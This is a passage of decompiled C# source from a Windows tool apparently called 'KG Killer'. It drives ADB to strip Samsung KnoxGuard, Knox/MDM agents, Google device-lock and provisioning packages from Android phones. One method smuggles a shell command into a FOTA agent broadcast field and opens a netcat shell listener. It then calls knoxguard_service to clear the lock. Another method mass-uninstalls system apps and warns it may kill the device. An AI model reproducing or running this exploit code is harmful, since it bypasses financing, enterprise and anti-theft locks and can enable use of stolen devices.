						text = managementObject["SerialNumber"].ToString();
					}
				}
			}
			catch
			{
				text = string.Empty;
			}
			return text;
		}

		// Token: 0x06000112 RID: 274 RVA: 0x0000AAF0 File Offset: 0x00008CF0
		private string GetBIOSproduct()
		{
			string text = string.Empty;
			try
			{
				ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_BaseBoard");
				using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
				{
					if (enumerator.MoveNext())
					{
						ManagementObject managementObject = (ManagementObject)enumerator.Current;
						text = managementObject["Product"].ToString();
					}
				}
			}
			catch
			{
				text = string.Empty;
			}
			return text;
		}

		// Token: 0x06000113 RID: 275 RVA: 0x0000AB78 File Offset: 0x00008D78
		private string GetProcessorID()
		{
			string text = string.Empty;
			try
			{
				ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_Processor");
				using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
				{
					if (enumerator.MoveNext())
					{
						ManagementObject managementObject = (ManagementObject)enumerator.Current;
						text = managementObject["ProcessorId"].ToString();
					}
				}
			}
			catch
			{
				text = string.Empty;
			}
			return text;
		}

		// Token: 0x06000114 RID: 276 RVA: 0x0000AC00 File Offset: 0x00008E00
		private string GetHardDriveSerialNumber()
		{
			string text = string.Empty;
			try
			{
				ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_PhysicalMedia");
				using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
				{
					if (enumerator.MoveNext())
					{
						ManagementObject managementObject = (ManagementObject)enumerator.Current;
						text = managementObject["SerialNumber"].ToString();
					}
				}
			}
			catch
			{
				text = string.Empty;
			}
			return text;
		}

		// Token: 0x06000115 RID: 277 RVA: 0x0000AC88 File Offset: 0x00008E88
		private string GenerateMD5Hash(string input)
		{
			string text;
			using (MD5 md = MD5.Create())
			{
				byte[] array = md.ComputeHash(Encoding.UTF8.GetBytes(input));
				StringBuilder stringBuilder = new StringBuilder();
				foreach (byte b in array)
				{
					stringBuilder.Append(b.ToString("x2"));
				}
				text = stringBuilder.ToString();
			}
			return text;
		}

		// Token: 0x06000116 RID: 278 RVA: 0x0000AD08 File Offset: 0x00008F08
		private void button29_Click(object sender, EventArgs e)
		{
			this.LoadPorts();
		}

		// Token: 0x06000117 RID: 279 RVA: 0x00007DB4 File Offset: 0x00005FB4
		private void label4_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000118 RID: 280 RVA: 0x0000AD1C File Offset: 0x00008F1C
		private async void button30_Click(object sender, EventArgs e)
		{
			MessageBox.Show("Use Only If You Have Setup With Android 14 QR CODE", "KG Killer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			this.Logs("\nChecking ADB Server..", Color.FloralWhite);
			await Task.Delay(100);
			if (this.CheckRunAdb())
			{
				this.Logs(" Running\n", Color.Green);
				TaskAwaiter taskAwaiter = Task.Delay(10).GetAwaiter();
				if (!taskAwaiter.IsCompleted)
				{
					await taskAwaiter;
					TaskAwaiter taskAwaiter2;
					taskAwaiter = taskAwaiter2;
					taskAwaiter2 = default(TaskAwaiter);
				}
				taskAwaiter.GetResult();
				this.Logs("Searching devices..\n", Color.FloralWhite);
				await Task.Delay(10);
				if (this.CariAdbDevice())
				{
					await Task.Delay(10);
					this.adbclients.SetDevice(this.SnAdb);
					Dictionary<string, string> props = this.adbclients.GetDeviceProperties();
					try
					{
						this.Logs("\nWAIT", Color.FloralWhite);
						this.progressBar1.Value = 0;
						Adb.AdbCommand("shell am start --user 0 -n com.mdmfixtool.mdmfixtool/.DisableFactoryReset");
						Thread.Sleep(1500);
						this.progressBar1.Value = 100;
						this.ResultTxt.SelectionColor = Color.Green;
						this.ResultTxt.AppendText(" ➾Successfully Disabled");
						this.progressBar1.Value = 0;
					}
					catch (Exception ex)
					{
						Console.WriteLine("Error: " + ex.Message);
					}
				}
			}
			else
			{
				await this.WaitForDevices();
			}
		}

		// Token: 0x06000119 RID: 281 RVA: 0x0000AD64 File Offset: 0x00008F64
		private async void button31_Click(object sender, EventArgs e)
		{
			this.Logs("\nChecking ADB Server..", Color.FloralWhite);
			await Task.Delay(100);
			if (this.CheckRunAdb())
			{
				this.Logs(" Running\n", Color.Green);
				TaskAwaiter taskAwaiter = Task.Delay(10).GetAwaiter();
				if (!taskAwaiter.IsCompleted)
				{
					await taskAwaiter;
					TaskAwaiter taskAwaiter2;
					taskAwaiter = taskAwaiter2;
					taskAwaiter2 = default(TaskAwaiter);
				}
				taskAwaiter.GetResult();
				this.Logs("Searching devices..\n", Color.FloralWhite);
				await Task.Delay(10);
				if (this.CariAdbDevice())
				{
					await Task.Delay(10);
					this.adbclients.SetDevice(this.SnAdb);
					Dictionary<string, string> props = this.adbclients.GetDeviceProperties();
					try
					{
						this.Logs("Wait a while", Color.FloralWhite);
						Adb.AdbCommand("shell pm disable-user --user 0 com.google.android.gsf");
						Thread.Sleep(1500);
						this.ResultTxt.SelectionColor = Color.Green;
						this.ResultTxt.AppendText(" ➾ Successfully Disabled \n");
					}
					catch (Exception ex)
					{
						Console.WriteLine("Error: " + ex.Message);
					}
				}
			}
			else
			{
				await this.WaitForDevices();
			}
		}

		// Token: 0x0600011A RID: 282 RVA: 0x00009EE0 File Offset: 0x000080E0
		private void button33_Click(object sender, EventArgs e)
		{
			Form2 form = new Form2();
			form.Show();
		}

		// Token: 0x0600011B RID: 283 RVA: 0x0000ADAC File Offset: 0x00008FAC
		private async void button32_Click(object sender, EventArgs e)
		{
			this.ResultTxt.Clear();
			MessageBox.Show("Please Try Again Same Process If Your Device is Locked", "KG Killer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			string usernamee = Form3.usrname;
			this.Logs("\nUser : ", Color.FloralWhite);
			this.Logs(usernamee, Color.OrangeRed);
			this.Logs("\nOperation :", Color.FloralWhite);
			this.Logs("KG Android 14 New Method 2\n", Color.Gold);
			try
			{
				this.Logs("\nChecking ADB Server..", Color.FloralWhite);
				await Task.Delay(100);
				if (this.CheckRunAdb())
				{
					this.Logs("Running\n", Color.Green);
					TaskAwaiter taskAwaiter = Task.Delay(10).GetAwaiter();
					TaskAwaiter taskAwaiter2;
					if (!taskAwaiter.IsCompleted)
					{
						await taskAwaiter;
						taskAwaiter = taskAwaiter2;
						taskAwaiter2 = default(TaskAwaiter);
					}
					taskAwaiter.GetResult();
					this.Logs("Searching devices..\n", Color.FloralWhite);
					await Task.Delay(10);
					this.progressBar1.Value = 10;
					if (this.CariAdbDevice())
					{
						TaskAwaiter taskAwaiter3 = Task.Delay(10).GetAwaiter();
						if (!taskAwaiter3.IsCompleted)
						{
							await taskAwaiter3;
							taskAwaiter3 = taskAwaiter2;
							taskAwaiter2 = default(TaskAwaiter);
						}
						taskAwaiter3.GetResult();
						this.adbclients.SetDevice(this.SnAdb);
						Dictionary<string, string> props = this.adbclients.GetDeviceProperties();
						try
						{
							this.Logs("Model  ➾ ", Color.FloralWhite);
							this.Logs(props["ro.product.model"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("Brand  ➾ ", Color.FloralWhite);
							this.Logs(props["ro.product.brand"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("CPU  ➾ ", Color.FloralWhite);
							this.Logs(props["ro.product.board"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("Version  ➾ ", Color.FloralWhite);
							this.Logs(props["ro.build.version.incremental"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("Build date  ➾ ", Color.FloralWhite);
							this.Logs(props["ro.build.date"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("Security patch  ➾ ", Color.FloralWhite);
							this.Logs(props["ro.build.version.security_patch"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("Android version  ➾ ", Color.FloralWhite);
							this.Logs(props["ro.build.version.release"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("Android SDK  ➾ ", Color.FloralWhite);
							this.Logs(props["ro.build.version.sdk"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("KG STATUS➾ ", Color.FloralWhite);
							this.Logs(props["knox.kg.state"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.progressBar1.Value = 20;
						}
						catch (Exception ex)
						{
							Console.WriteLine("Error: " + ex.Message);
						}
						this.Logs("Writing Data File ", Color.FloralWhite);
						this.Logs(" OK\n", Color.FloralWhite);
						await Task.Delay(100);
						this.progressBar1.Value = 40;
						await this.PushApkAsync("fota_apk.apk", "/data/local/tmp/fota_apk.apk");
						await Task.Delay(500);
						this.Logs("Writing Data File To System ", Color.FloralWhite);
						string[] adbCommands = new string[]
						{
							"pm install /data/local/tmp/fota_apk.apk", "mkdir /sdcard/mdmfixtool", "pm uninstall-system-updates com.samsung.android.kgclient", "pm disable-user --user 0 com.samsung.android.kgclient", "pm uninstall --user 0 com.android.systemui", "pm uninstall --user 0 com.samsung.klmsagent", "pm uninstall --user 0 com.android.ons", "pm uninstall --user 0 com.android.dynsystem", "pm uninstall --user 0 com.samsung.android.app.updatecenter", "pm uninstall --user 0 com.google.android.configupdater",
							"pm uninstall --user 0 com.wssyncmldm", "pm uninstall --user 0 com.sec.enterprise.knox.cloudmdm.smdms", "am set-inactive com.samsung.android.kgclient true", "am kill com.samsung.android.kgclient", "am crash com.samsung.android.kgclient", "am stop-app com.samsung.android.kgclient", "pm uninstall-system-updates com.samsung.android.kgclient", "pm disable-user --user 0 com.samsung.android.kgclient", "pm enable --user 0 com.samsung.android.kgclient", "pm uninstall-system-updates com.samsung.android.kgclient",
							"pm suspend com.samsung.android.kgclient", "pm uninstall --user 0 com.samsung.android.kgclient", "am start -n com.sdet.fotaagent/.Main", "am broadcast -a com.sdet.fotaagent.intent.CP_FILE -e CP_FILE /sdcard/mdmfixtool -e CP_LOC \"/data/data/com.samsung.SMT && /system/bin/sh -c \"toybox netcat -s 127.0.0.1 -p 8133 -L sh -l\"\""
						};
						this.Logs(" OK\n", Color.Green);
						this.progressBar1.Value = 50;
						this.Logs("Erase KG ", Color.FloralWhite);
						Thread.Sleep(1100);
						foreach (string command in adbCommands)
						{
							this.adbclients.ExecuteRemoteCommand(command);
							Thread.Sleep(200);
							command = null;
						}
						string[] array = null;
						List<string> list3 = new List<string>
						{
							"nc localhost 8133 || nc 127.0.0.1 8133", "input text 'service call knoxguard_service 36'", "input keyevent 66", "input text 'service call knoxguard_service 40 s16 \"null\"'", "input keyevent 66", "input text 'service call knoxguard_service 39'", "input keyevent 66", "pm suspend com.samsung.android.kgclient", "am set-inactive com.samsung.android.kgclient true", "pm enable --user 0 com.samsung.android.kgclient",
							"pm install-existing --restrict-permissions --user 0 com.samsung.android.kgclient", "am kill com.samsung.android.kgclient", "am crash com.samsung.android.kgclient", "am stop-app com.samsung.android.kgclient", "cmd appops set com.samsung.android.kgclient RUN_IN_BACKGROUND deny", "cmd appops set com.samsung.android.kgclient RUN_ANY_IN_BACKGROUND deny", "cmd appops set com.samsung.android.kgclient WAKE_LOCK deny", "pm install-existing --restrict-permissions --user 0 com.android.systemui", "am force-stop com.sdet.fotaagent --user 0", "pm uninstall --user 0 com.sdet.fotaagent",
							"reboot"
						};
						this.progressBar1.Value = 80;
						Process process3 = ShellController.CreateShellProcess();
						foreach (string command2 in list3)
						{
							string output = ShellController.ExecuteShellCommand(process3, command2, 20000);
							output = this.CustomizeOutput(output);
							output = null;
							command2 = null;
						}
						List<string>.Enumerator enumerator = default(List<string>.Enumerator);
						ShellController.CloseShellProcess(process3);
						this.Logs(" Ok\n", Color.Green);
						this.progressBar1.Value = 90;
						string text = await this.<button32_Click>g__GetWaitForDevicesResultAsync|104_0();
						string result = text + "\n";
						text = null;
						this.Logs("KG STATUS: ", Color.FloralWhite);
						this.Logs(props["knox.kg.state"] + " \n", Color.Green);
						this.progressBar1.Value = 100;
						this.Logs("KG Removed Sucessfully By KG Killer\n\r", Color.Gold);
						Thread.Sleep(2000);
						this.Logs("This Is Beta Method\r\n", Color.Gold);
						this.Logs("If Your Device Is Still Locked\r\n", Color.Red);
						this.Logs("Contact US On Telegram\r\n", Color.Gold);
						this.progressBar1.Value = 0;
						props = null;
						adbCommands = null;
						list3 = null;
						process3 = null;
					}
					else
					{
						this.Logs("Device not found", Color.Red);
					}
				}
				else
				{
					await this.WaitForDevices();
				}
			}
			catch (Exception ex2)
			{
				Console.WriteLine("Error: " + ex2.Message);
			}
		}

		// Token: 0x0600011C RID: 284 RVA: 0x00009EE0 File Offset: 0x000080E0
		private void button3_Click_1(object sender, EventArgs e)
		{
			Form2 form = new Form2();
			form.Show();
		}

		// Token: 0x0600011D RID: 285 RVA: 0x0000ADF4 File Offset: 0x00008FF4
		private void button33_Click_1(object sender, EventArgs e)
		{
			A14_QR_2 a14_QR_ = new A14_QR_2();
			a14_QR_.Show();
		}

		// Token: 0x0600011E RID: 286 RVA: 0x0000AE10 File Offset: 0x00009010
		private async void button11_Click(object sender, EventArgs e)
		{
			this.Logs("\nChecking ADB Server..", Color.FloralWhite);
			string usernamee = Form3.usrname;
			this.Logs("\nUser : ", Color.FloralWhite);
			this.Logs(usernamee, Color.OrangeRed);
			this.Logs("\nOperation:", Color.FloralWhite);
			this.Logs("IT Admin VIVO (New Security)\n", Color.Gold);
			await Task.Delay(100);
			if (!this.CheckRunAdb())
			{
				TaskAwaiter taskAwaiter = this.WaitForDevices().GetAwaiter();
				if (!taskAwaiter.IsCompleted)
				{
					await taskAwaiter;
					TaskAwaiter taskAwaiter2;
					taskAwaiter = taskAwaiter2;
					taskAwaiter2 = default(TaskAwaiter);
				}
				taskAwaiter.GetResult();
			}
			else
			{
				this.Logs(" Running\n", Color.Green);
				TaskAwaiter taskAwaiter3 = Task.Delay(10).GetAwaiter();
				if (!taskAwaiter3.IsCompleted)
				{
					await taskAwaiter3;
					TaskAwaiter taskAwaiter2;
					taskAwaiter3 = taskAwaiter2;
					taskAwaiter2 = default(TaskAwaiter);
				}
				taskAwaiter3.GetResult();
				this.Logs("Searching devices..\n", Color.FloralWhite);
				await Task.Delay(10);
				if (this.CariAdbDevice())
				{
					await Task.Delay(10);
					this.adbclients.SetDevice(this.SnAdb);
					Dictionary<string, string> props = this.adbclients.GetDeviceProperties();
					try
					{
						this.Logs("Model  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.product.model"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Version  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.build.version.incremental"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Build date  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.build.date"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Security patch  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.build.version.security_patch"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
						this.Logs("Android version  ➾ ", Color.FloralWhite);
						this.Logs(props["ro.build.version.release"], Color.Green);
						this.Logs("\n", Color.FloralWhite);
					}
					catch (Exception ex)
					{
						Console.WriteLine("Error: " + ex.Message);
					}
					this.Logs("Removing", Color.Green);
					Adb.AdbCommand("shell pm disable-user --user 0 com.google.android.safetycenter.resources");
					Adb.AdbCommand("shell pm clear --user 0 com.google.android.safetycenter.resources");
					Adb.AdbCommand("shell pm disable-user --user 0 com.google.android.ondevicepersonalization.services");
					Adb.AdbCommand("shell pm disable-user --user 0 com.google.android.gsf");
					Adb.AdbCommand("shell pm disable-user --user 0 com.android.companiondevicemanager");
					Adb.AdbCommand("shell pm disable-user --user 0 com.android.devicelockcontroller");
					Adb.AdbCommand("shell pm disable com.android.devicelockcontroller");
					Adb.AdbCommand("shell pm clear --user 0 com.google.android.ondevicepersonalization.services");
					Adb.AdbCommand("shell pm clear --user 0 com.android.companiondevicemanager");
					Adb.AdbCommand("shell pm clear --user 0 com.android.devicelockcontroller");
					Adb.AdbCommand("shell pm disable-user --user 0 vendor.qti.data.txpwradmin");
					Adb.AdbCommand("shell pm disable-user --user 0 vendor.qti.data.txpwradmin");
					Adb.AdbCommand("shell pm disable-user --user 0 com.android.managedprovisioning");
					Adb.AdbCommand("reboot");
					this.Logs("Successfully DONE", Color.Green);
					props = null;
				}
			}
		}

		// Token: 0x0600011F RID: 287 RVA: 0x0000AE58 File Offset: 0x00009058
		private async void button34_Click(object sender, EventArgs e)
		{
			this.ResultTxt.Clear();
			MessageBox.Show("This Method Cause Your Device Dead", "KG Killer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			try
			{
				this.Logs("\nChecking ADB Server..", Color.FloralWhite);
				await Task.Delay(100);
				if (this.CheckRunAdb())
				{
					this.Logs(" Running\n", Color.Green);
					TaskAwaiter taskAwaiter = Task.Delay(10).GetAwaiter();
					TaskAwaiter taskAwaiter2;
					if (!taskAwaiter.IsCompleted)
					{
						await taskAwaiter;
						taskAwaiter = taskAwaiter2;
						taskAwaiter2 = default(TaskAwaiter);
					}
					taskAwaiter.GetResult();
					this.Logs("Searching devices..\n", Color.FloralWhite);
					await Task.Delay(10);
					this.progressBar1.Value = 10;
					if (this.CariAdbDevice())
					{
						TaskAwaiter taskAwaiter3 = Task.Delay(10).GetAwaiter();
						if (!taskAwaiter3.IsCompleted)
						{
							await taskAwaiter3;
							taskAwaiter3 = taskAwaiter2;
							taskAwaiter2 = default(TaskAwaiter);
						}
						taskAwaiter3.GetResult();
						this.adbclients.SetDevice(this.SnAdb);
						Dictionary<string, string> props = this.adbclients.GetDeviceProperties();
						try
						{
							this.Logs("Model  ➾ ", Color.FloralWhite);
							this.Logs(props["ro.product.model"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("Brand  ➾ ", Color.FloralWhite);
							this.Logs(props["ro.product.brand"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("CPU  ➾ ", Color.FloralWhite);
							this.Logs(props["ro.product.board"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("Version  ➾ ", Color.FloralWhite);
							this.Logs(props["ro.build.version.incremental"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("Build date  ➾ ", Color.FloralWhite);
							this.Logs(props["ro.build.date"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("Security patch  ➾ ", Color.FloralWhite);
							this.Logs(props["ro.build.version.security_patch"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("Android version  ➾ ", Color.FloralWhite);
							this.Logs(props["ro.build.version.release"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("Android SDK  ➾ ", Color.FloralWhite);
							this.Logs(props["ro.build.version.sdk"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("KG STATUS➾ ", Color.FloralWhite);
							this.Logs(props["knox.kg.state"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.progressBar1.Value = 20;
						}
						catch (Exception ex)
						{
							Console.WriteLine("Error: " + ex.Message);
						}
						this.Logs("Configuring Device Status ", Color.FloralWhite);
						this.Logs(" OK\n", Color.FloralWhite);
						await Task.Delay(100);
						this.progressBar1.Value = 40;
						this.Logs("Unistalling Apps", Color.FloralWhite);
						string[] adbCommands = new string[]
						{
							"shell pm disable-user --user 0 com.samsung.knox.securefolder", "shell pm disable-user --user 0 com.sec.enterprise.knox.attestation", "shell pm disable-user --user 0 com.sec.knox.bridge", "shell pm disable-user --user 0 com.samsung.android.knox.analytics.uploader", "shell pm disable-user --user 0 com.sec.knox.knoxsetupwizardclient", "shell pm disable-user --user 0 com.samsung.knox.keychain", "shell pm disable-user --user 0 com.sec.enterprise.knox.cloudmdm.smdms", "shell pm disable-user --user 0 com.samsung.android.knox.attestation", "shell pm disable-user --user 0 com.sec.enterprise.mdm.services.samsung", "shell pm uninstall --user 0 com.sec.android.app.samsungapps",
							"shell pm uninstall --user 0 com.samsung.android.app.contacts", "shell pm uninstall --user 0 com.samsung.android.messaging", "shell pm uninstall --user 0 com.samsung.android.app.routines", "shell pm uninstall --user 0 com.sec.android.easyMover", "shell pm uninstall --user 0 com.samsung.android.visioncloudagent", "shell pm uninstall --user 0 com.samsung.android.bixby.agent", "shell pm uninstall --user 0 com.samsung.android.bixby.service", "shell pm uninstall --user 0 com.samsung.android.spay", "shell pm uninstall --user 0 com.samsung.android.email.provider", "shell pm uninstall --user 0 com.samsung.android.kidsinstaller",
							"shell pm uninstall --user 0 com.samsung.android.app.dialer", "shell pm uninstall --user 0 com.sec.android.widgetapp.samsungapps", "shell pm uninstall --user 0 com.sec.spp.push", "shell pm uninstall --user 0 com.samsung.android.oneconnect", "shell pm uninstall --user 0 com.samsung.android.game.gamehome", "shell pm uninstall --user 0 com.samsung.android.aremoji", "shell pm uninstall --user 0 com.samsung.android.app.tips", "shell pm uninstall --user 0 com.samsung.android.samsungpass", "shell pm uninstall --user 0 com.samsung.android.samsungpassautofill", "shell pm uninstall --user 0 com.sec.android.app.popupuireceiver",
							"shell pm uninstall --user 0 com.google.android.apps.tachyon", "shell pm uninstall --user 0 com.android.chrome", "shell pm uninstall --user 0 com.google.android.youtube", "shell pm uninstall --user 0 com.android.vending", "shell pm uninstall --user 0 com.google.android.apps.maps", "shell pm uninstall --user 0 com.google.android.apps.photos", "shell pm uninstall --user 0 com.sec.android.inputmethod", "shell pm uninstall --user 0 com.sec.android.daemonapp", "shell pm uninstall --user 0 com.sec.enterprise.mdm.services.simpin"
						};
						this.Logs(" OK\n", Color.Green);
						this.progressBar1.Value = 50;
						this.Logs("Removing MDM", Color.FloralWhite);
						foreach (string command in adbCommands)
						{
							this.adbclients.ExecuteRemoteCommand(command);
							Thread.Sleep(200);
							command = null;
						}
						string[] array = null;
						List<string> list3 = new List<string>
						{
							"shell pm uninstall --user 0 com.sec.knox.bridge", "shell pm uninstall --user 0 com.sec.enterprise.knox.cloudmdm.smdms", "shell pm uninstall --user 0 com.sec.knox.seandroid", "shell pm uninstall --user 0 com.sec.knox.store", "shell pm uninstall --user 0 com.samsung.android.knox.analytics.uploader", "shell pm uninstall --user 0 com.samsung.android.knox.attestation", "shell pm uninstall --user 0 com.samsung.android.knox.containeragent", "shell pm uninstall --user 0 com.samsung.android.knox.containercore", "shell pm uninstall --user 0 com.sec.enterprise.knox.cloudmdm.smdms", "shell pm uninstall --user 0 com.samsung.android.knox.pushmanager",
							"shell pm uninstall --user 0 com.samsung.android.knox.restriction", "shell pm uninstall --user 0 com.sec.enterprise.mdm.services.knox", "shell pm uninstall --user 0 com.samsung.klmsagent", "shell pm uninstall --user 0 com.samsung.android.knox.enrollment", "shell pm uninstall --user 0 com.samsung.android.knox.containeragent", "shell pm uninstall --user 0 com.samsung.android.knox.shareddevice", "shell pm uninstall --user 0 com.samsung.android.knox.containercore", "shell pm uninstall --user 0 com.samsung.android.bixby.agent", "shell pm uninstall --user 0 com.samsung.android.bixbyvision.framework", "shell pm uninstall --user 0 com.samsung.android.bixby.wakeup",
							"shell pm uninstall --user 0 com.samsung.android.bixby.service", "shell pm uninstall --user 0 com.samsung.android.bixby.agent.dummy", "shell pm uninstall --user 0 com.samsung.android.bixby.voiceinput", "shell pm uninstall --user 0 com.samsung.android.aremoji", "shell pm uninstall --user 0 com.samsung.android.visioncloudagent", "shell pm uninstall --user 0 com.samsung.android.arzone", "shell pm uninstall --user 0 com.samsung.android.visionintelligence", "shell pm uninstall --user 0 com.samsung.android.visioncloudagent", "shell pm uninstall --user 0 com.samsung.android.email.provider", "shell pm uninstall --user 0 com.samsung.android.calendar",
							"shell pm uninstall --user 0 com.samsung.android.browser", "shell pm uninstall --user 0 com.samsung.knox.securefolder", "shell pm uninstall --user 0 com.samsung.android.knox.containercore", "shell pm uninstall --user 0 com.samsung.android.knox.containeragent", "shell pm uninstall --user 0 com.samsung.android.samsungpay", "shell pm uninstall --user 0 com.samsung.android.authfw", "shell pm uninstall --user 0 com.samsung.android.samsungpass", "shell pm uninstall --user 0 com.samsung.android.scloud", "shell pm uninstall --user 0 com.samsung.android.samsungaccount", "shell pm uninstall --user 0 com.samsung.android.game.gamehome",
							"shell pm uninstall --user 0 com.samsung.android.game.gametools", "shell pm uninstall --user 0 com.samsung.android.game.gos", "shell pm uninstall --user 0 com.samsung.android.gametuner.thin", "shell pm uninstall --user 0 com.samsung.android.spay", "shell pm uninstall --user 0 com.samsung.android.oneconnect", "shell pm uninstall --user 0 com.samsung.android.smartmirroring", "shell pm uninstall --user 0 com.samsung.android.ststub", "shell pm uninstall --user 0 com.samsung.android.service.aircommand", "shell pm uninstall --user 0 com.samsung.android.app.watchmanager", "shell pm uninstall --user 0 com.samsung.android.gearoplugin",
							"shell pm uninstall --user 0 com.samsung.android.app.watchmanagerstub", "shell pm uninstall --user 0 com.microsoft.skydrive", "shell pm uninstall --user 0 com.microsoft.office.excel", "shell pm uninstall --user 0 com.microsoft.office.word", "shell pm uninstall --user 0 com.microsoft.office.powerpoint", "shell pm uninstall --user 0 com.microsoft.office.onenote", "shell pm uninstall --user 0 com.microsoft.office.outlook", "shell pm uninstall --user 0 com.google.android.music", "shell pm uninstall --user 0 com.google.android.videos", "shell pm uninstall --user 0 com.google.android.apps.tachyon",
							"shell pm uninstall --user 0 com.google.android.googlequicksearchbox", "shell pm uninstall --user 0 com.google.android.gms.location.history", "shell pm uninstall --user 0 com.samsung.android.scloud", "shell pm uninstall --user 0 com.samsung.android.app.dexonpc", "shell pm uninstall --user 0 com.samsung.android.mobileservice", "shell pm uninstall --user 0 com.samsung.android.ipsgeofence", "shell pm uninstall --user 0 com.samsung.android.mdx", "shell pm uninstall --user 0 com.samsung.android.mdx.quickboard", "shell pm uninstall --user 0 com.samsung.android.mateagent", "shell pm uninstall --user 0 com.samsung.android.kidsinstaller",
							"shell pm uninstall --user 0 com.samsung.android.kidsinstaller", "shell pm uninstall --user 0 com.sec.android.app.sbrowser", "shell pm uninstall --user 0 com.samsung.android.sdk.professionalaudio", "shell pm disable-user --user 0 com.samsung.android.game.gametools", "shell pm disable-user --user 0 com.samsung.android.bixby.wakeup", "shell pm disable-user --user 0 com.samsung.android.bixby.service", "shell pm disable-user --user 0 com.samsung.android.samsungpass", "shell pm disable-user --user 0 com.samsung.android.visionintelligence", "shell pm disable-user --user 0 com.samsung.android.knox.attestation", "shell pm uninstall --user 0 com.sec.enterprise.mdm.services.simpin",
							"shell pm uninstall --user 0 com.sec.knox.bridge", "shell pm uninstall --user 0 com.sec.enterprise.knox.cloudmdm.smdms", "shell pm uninstall --user 0 com.samsung.android.knox.containercore", "shell pm uninstall --user 0 com.samsung.knox.securefolder", "shell pm uninstall --user 0 com.samsung.android.knox.attestation", "shell pm uninstall --user 0 com.samsung.android.knox.analytics.uploader", "shell pm uninstall --user 0 com.sec.enterprise.mdm.vpn", "shell pm uninstall --user 0 com.samsung.knox.keychain", "shell pm uninstall --user 0 com.samsung.android.knox.containeragent", "shell pm uninstall --user 0 com.sec.knox.switcher",
							"shell pm uninstall --user 0 com.samsung.android.knox.pushmanager", "shell pm uninstall --user 0 com.samsung.android.bbc.bbcagent", "shell pm uninstall --user 0 com.samsung.klmsagent", "shell pm uninstall --user 0 com.samsung.android.knox.containercore", "shell pm uninstall --user 0 com.samsung.android.knox.containeragent", "shell pm uninstall --user 0 com.sec.knox.knoxsetupwizardclient", "shell pm uninstall --user 0 com.sec.enterprise.knox.attestation", "shell pm uninstall --user 0 com.sec.enterprise.knox.cloudmdm.smdms", "shell pm uninstall --user 0 com.samsung.android.knox.restriction", "shell pm uninstall --user 0 com.sec.knox.eventsmanager",
							"shell pm uninstall --user 0 com.samsung.knox.securefolder.setuppage", "shell pm uninstall --user 0 com.samsung.android.service.securewifi", "shell pm uninstall --user 0 com.sec.enterprise.knox.shareddevice.admin", "shell pm uninstall --user 0 com.samsung.android.knox.sdp", "shell pm uninstall --user 0 com.samsung.knox.support", "shell pm uninstall --user 0 com.sec.knox.switcher", "shell pm uninstall --user 0 com.samsung.android.mdmclient", "shell pm uninstall --user 0 com.samsung.android.knox.dpa", "shell pm uninstall --user 0 com.samsung.android.knox.analytics", "shell pm uninstall --user 0 com.sec.knox.containeragent.enrollment",
							"shell pm uninstall --user 0 com.sec.knox.containeragent.restriction", "shell pm uninstall --user 0 com.sec.enterprise.knox.mdmlite", "shell pm uninstall --user 0 com.samsung.android.knox.containerbroadcastreceiver", "shell pm uninstall --user 0 com.samsung.android.knox.containerkeyguard", "shell pm uninstall --user 0 com.samsung.knox.kids.home", "shell pm uninstall --user 0 com.sec.knox.customizer", "shell pm uninstall --user 0 com.sec.enterprise.knox.syncml", "shell pm uninstall --user 0 com.samsung.android.knox.container", "shell pm uninstall --user 0 com.samsung.knox.keyguard", "shell pm uninstall --user 0 com.samsung.android.knox.containerpolicy",
							"shell pm uninstall --user 0 com.sec.knox.containeragent.policy", "shell pm uninstall --user 0 com.sec.knox.containeragent.restriction", "shell pm uninstall --user 0 com.sec.knox.eventsmanager", "shell pm uninstall --user 0 com.sec.enterprise.knox.container.utils", "shell pm uninstall --user 0 com.sec.knox.switcher", "shell pm uninstall --user 0 com.samsung.android.knox.containercore"
						};
						this.progressBar1.Value = 80;
						Process process3 = ShellController.CreateShellProcess();
						foreach (string command2 in list3)
						{
							string output = ShellController.ExecuteShellCommand(process3, command2, 20000);
							output = this.CustomizeOutput(output);
							output = null;
							command2 = null;
						}
						List<string>.Enumerator enumerator = default(List<string>.Enumerator);
						ShellController.CloseShellProcess(process3);
						this.Logs(" Ok\n", Color.Green);
						this.progressBar1.Value = 90;
